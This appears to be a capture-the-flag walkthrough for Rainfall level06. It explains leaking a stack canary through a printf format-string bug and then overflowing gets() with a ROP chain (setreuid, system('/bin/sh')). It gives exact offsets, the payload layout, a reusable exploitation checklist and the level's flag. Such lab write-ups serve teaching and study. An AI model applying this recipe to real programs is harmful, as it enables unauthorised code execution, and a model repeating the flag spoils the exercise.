# Rainfall — Level06 Walkthrough: defeating a stack canary

This level introduces a new protection — the stack canary — and shows
how a memory-disclosure bug turns it from a wall into a formality.

## 1. The problem: why the old recipe dies

Every exploit so far relied on the same assumption: write a payload over
the stack, let the function return, control RIP. Nothing checked the
stack integrity between the write and the `ret`.

The canary breaks that assumption. A protected function does this:

```asm
prologue:  mov rax, fs:0x28       ; read the thread-local canary
           mov [rbp-0x8], rax     ; park it between locals and saved RBP
...
epilogue:  mov rax, [rbp-0x8]     ; read it back
           sub rax, fs:0x28       ; compare with the original
           jne -> __stack_chk_fail ; abort if it changed
```

The frame of the vulnerable function (`authenticate`):

```text
rbp-0x90  buffer            <- the overflow starts here
   ...
rbp-0x8   CANARY            <- the sentinel stands in the way
rbp+0x0   saved RBP
rbp+0x8   return address    <- the target
```

`gets()` writes contiguously. Reaching the return address REQUIRES
walking over the canary — and rewriting it. At the epilogue the
comparison fails and the process dies before its `ret`.

So the missing piece is exactly one piece of information: the canary
value. If we know it, we can rewrite it byte for byte and the check
passes. The whole method is about obtaining that value.

## 2. Three golden rules of the leak

1. **Same value, same process.** The canary comes from the kernel
   (`AT_RANDOM`) at every exec — it changes between runs. A canary
   leaked from process A is worthless in process B. Leak and exploit
   must happen in the SAME run.
2. **We need a read primitive**: something that prints data it should
   not print. Here: a format string.
3. **Order matters**: the leak must execute BEFORE the exploit writes
   the stack.

## 3. The read primitive: the format string

`log_request` (0x401418) reads the request ID with a bounded
`fgets(buf, 0x40)` and then does:

```asm
40149d:  lea    -0x50(%rbp),%rax
4014a1:  mov    %rax,%rdi
4014a4:  mov    $0x0,%eax
4014a9:  call   printf@plt        <- printf(buf): user buffer AS the format
```

`printf` is variadic: when it meets `%p`, it fetches an argument from
the argument locations — registers first (`rsi, rdx, rcx, r8, r9` =
args 1-5), then the stack right above its frame. Above that frame lie
the caller's frames: the buffer, the canary, the pointers.

## 4. Computing the argument index

Each stack argument is one qword at `rsp + 8*k` when printf is entered.
Walking frame by frame from the disassembly (`sub $0x50`, buffer at
`rbp-0x50..-0x11`):

```text
call printf          : retaddr pushed at rbp-0x58
printf entry         : rsp = rbp-0x58

arg  6  = [rsp+8]  = rbp-0x50  = buffer qword 0
arg  7..13         = rbp-0x48..  = buffer qwords 1..7
arg 14             = rbp-0x10    = unused slot
arg 15             = rbp-0x8     = THE CANARY
```

General formula: `arg = 6 + (target - rsp_at_call) / 8`. The probe is
five characters: `%15$p`. Sanity check: `%6$p` echoes the probe's own
bytes in little-endian ASCII — proof the walk is correct.

The leak output:

```text
[3JANE] Logging: 0xc68566e5971eab00
```

Note the trailing `00`: the canary's least significant byte is null by
design — it kills leaks through `strcpy`/`%s`, because those stop at
NUL. `%p` reads the qword as a VALUE, so it is not affected.

## 5. Rebuilding the payload

`authenticate` (0x4014de) reads with `gets` into `rbp-0x90`. `gets`
copies raw bytes (NUL included) until a newline, so the canary can be
rewritten exactly:

```text
"A" * 136        buffer up to the canary (buffer -> canary = 0x88)
canary (8)       the leaked value, unchanged -> check passes
fake RBP (8)     junk (popped, never used)
ROP chain        buffer -> return address = 0x98 = 152
```

The chain is the level03/05 recipe: `setreuid(1023, 1023)` then
`system("/bin/sh")`, with libc fixed at `0x7ffff7c00000` (ASLR off):
pop rdi at +0x10c08d, pop rsi at +0x110b7d, setreuid at +0x127370,
system at +0x58750, "/bin/sh" at +0x1cc42f. Stack alignment at system
entry is 8 mod 16 — no movaps crash. The "Access denied." line printed
by `strncmp` is cosmetic: `gets` has already overwritten everything.

## 6. Practical traps

- The canary is random per run: leak and exploit in one process (the
  program's flow already does: `log_request` then `authenticate`).
- A random canary byte can be 0x0a (2.7% over 7 bytes), which truncates
  the gets line — the poc retries with a fresh process.
- pwntools trap: `recvuntil(b"Access code: ")` consumes the marker;
  following it with `sendafter(b"Access code: ", ...)` waits for the
  same marker again and hangs forever. Use `send()`.
- Binary-only level: `nm` maps the functions, `strings` shows the
  constants (`STRAYLIGHT_`, vault entries), the `fs:0x28` prologue
  marks canaried functions, and locating the `gets` call picks the
  target.

## 7. The reusable recipe

```text
1. Map the binary: nm + strings + objdump -> functions, gets/printf suspects
2. Spot the canary: fs:0x28 prologue in the vulnerable function
3. Find a leak: format string, unbounded %s, oracle...
4. Compute the varargs index: arg = 6 + (target - rsp) / 8
5. Leak in the same process, BEFORE the exploit
6. Payload: padding + original canary + fake_rbp + ROP
7. ROP: setreuid(euid, euid) + system (or execv with "-p")
8. Retry if a canary byte is 0x0a
```

## 8. Result

```text
uid=1023(flag06) gid=1009(level06) groups=1009(level06),1001(levelgroup)
c1t0kg9pklac7x4c7sn7iqgfppkz4usq
```

The flag is the SSH password for level07.
